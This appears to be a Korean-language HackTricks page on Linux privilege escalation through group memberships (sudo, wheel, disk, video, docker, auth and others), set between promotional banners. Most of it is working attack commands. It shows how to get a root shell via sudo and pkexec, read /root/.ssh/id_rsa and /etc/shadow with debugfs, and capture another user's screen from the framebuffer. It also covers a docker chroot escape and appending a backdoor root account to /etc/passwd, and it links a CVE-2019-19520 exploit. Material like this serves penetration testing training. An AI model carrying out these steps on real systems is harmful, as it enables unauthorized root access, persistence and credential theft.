# 흥미로운 그룹 - Linux Privesc

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## Sudo/Admin 그룹

### **PE - 방법 1**

**가끔**, **기본적으로 (또는 일부 소프트웨어가 필요하기 때문에)** **/etc/sudoers** 파일 내에서 다음과 같은 줄을 찾을 수 있습니다:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
이는 **sudo 또는 admin 그룹에 속한 모든 사용자가 sudo로 모든 것을 실행할 수 있다는 것을 의미**합니다.

이 경우, **루트로 전환하기 위해 다음을 실행**할 수 있습니다:
```
sudo su
```
### PE - 방법 2

모든 suid 바이너리를 찾고, 바이너리 **Pkexec**이 있는지 확인하세요:
```bash
find / -perm -4000 2>/dev/null
```
만약 **pkexec 바이너리가 SUID 바이너리**로 설정되어 있고, 당신이 **sudo** 또는 **admin** 그룹에 속해 있다면, `pkexec`를 사용하여 바이너리를 sudo 권한으로 실행할 수 있을 것입니다.\
일반적으로 이러한 그룹들은 **polkit 정책** 내에 존재합니다. 이 정책은 어떤 그룹이 `pkexec`를 사용할 수 있는지를 식별하는 역할을 합니다. 다음 명령어로 확인할 수 있습니다:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
다음에서는 어떤 그룹이 **pkexec**를 실행할 수 있는지와 **기본적으로** 일부 Linux 배포판에서 **sudo**와 **admin** 그룹이 나타나는 것을 확인할 수 있습니다.

**루트로 전환하려면 다음을 실행하세요**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
만약 **pkexec**를 실행하려고 하면 다음과 같은 **오류**가 발생합니다:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**권한이 없는 것이 아니라 GUI 없이 연결되지 않았기 때문입니다**. 이 문제에 대한 해결책은 여기에 있습니다: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2개의 다른 ssh 세션이 필요**합니다:

{% code title="세션1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel 그룹

**가끔**, **기본적으로** **/etc/sudoers** 파일 안에 다음과 같은 줄을 찾을 수 있습니다:
```
%wheel	ALL=(ALL:ALL) ALL
```
이는 **wheel 그룹에 속한 모든 사용자가 sudo로 모든 것을 실행할 수 있다는 것을 의미**합니다.

이 경우, **루트가 되기 위해 다음을 실행**할 수 있습니다:
```
sudo su
```
## 그림자 그룹

**그림자 그룹**의 사용자는 **/etc/shadow** 파일을 **읽을 수 있습니다**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## 디스크 그룹

이 권한은 기계 내의 모든 데이터에 액세스할 수 있기 때문에 거의 **루트 액세스와 동등**합니다.

파일: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
debugfs를 사용하여 **파일을 작성**할 수도 있습니다. 예를 들어 `/tmp/asd1.txt`를 `/tmp/asd2.txt`로 복사하려면 다음과 같이 할 수 있습니다:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
그러나, 만약 당신이 root 소유의 파일 (예: `/etc/shadow` 또는 `/etc/passwd`)을 **쓰려고 하면**, "**Permission denied**" 오류가 발생합니다.

## Video 그룹

`w` 명령어를 사용하여 **시스템에 로그인한 사용자를 찾을 수** 있으며, 다음과 같은 출력을 보여줍니다:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**은 사용자 **yossi가 물리적으로** 기기의 터미널에 로그인되어 있는 것을 의미합니다.

**video 그룹**은 화면 출력을 볼 수 있는 권한을 가지고 있습니다. 기본적으로 화면을 관찰할 수 있습니다. 이를 위해서는 현재 화면의 이미지를 원시 데이터로 캡처하고 화면이 사용하는 해상도를 얻어야 합니다. 화면 데이터는 `/dev/fb0`에 저장될 수 있으며, 이 화면의 해상도는 `/sys/class/graphics/fb0/virtual_size`에서 확인할 수 있습니다.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**GIMP**를 사용하여 **원본 이미지**를 **열 수** 있습니다. `screen.raw` 파일을 선택하고 파일 유형으로 **Raw 이미지 데이터**를 선택합니다:

![](<../../../.gitbook/assets/image (287) (1).png>)

그런 다음 화면에서 사용하는 너비와 높이를 수정하고 다른 이미지 유형을 확인합니다 (화면을 더 잘 보여주는 것을 선택합니다):

![](<../../../.gitbook/assets/image (288).png>)

## 루트 그룹

기본적으로 **루트 그룹의 구성원**은 **일부 서비스** 구성 파일이나 **라이브러리** 파일 또는 **기타 흥미로운 항목**을 수정할 수 있는 권한을 가질 수 있습니다. 이를 통해 권한을 상승시킬 수 있습니다...

**루트 구성원이 수정할 수 있는 파일을 확인하세요**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## 도커 그룹

인스턴스의 볼륨에 호스트 머신의 루트 파일 시스템을 마운트할 수 있으므로, 인스턴스가 시작되면 해당 볼륨에 `chroot`가 즉시 로드됩니다. 이로써 머신에서 root 권한을 얻을 수 있습니다.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
마지막으로, 이전에 제안된 것 중 마음에 들지 않거나 (도커 API 방화벽 등의 이유로) 작동하지 않는 경우, 여기에서 설명한대로 **권한이 있는 컨테이너를 실행하고 탈출**해 볼 수도 있습니다:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

도커 소켓에 대한 쓰기 권한이 있는 경우 [**도커 소켓을 악용하여 권한 상승하는 방법에 대한 이 게시물을 읽어보세요**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd 그룹

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm 그룹

일반적으로 **`adm`** 그룹의 **멤버**는 _/var/log/_에 있는 **로그 파일을 읽을 수 있는 권한**을 가지고 있습니다.\
따라서 이 그룹 내에서 사용자를 침해했다면 **로그를 확인**해야 합니다.

## Auth 그룹

OpenBSD에서는 **auth** 그룹이 사용된다면 일반적으로 _**/etc/skey**_ 및 _**/var/db/yubikey**_ 폴더에 쓰기 권한을 가질 수 있습니다.\
이러한 권한은 다음 exploit을 사용하여 **루트 권한 상승**에 악용될 수 있습니다: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
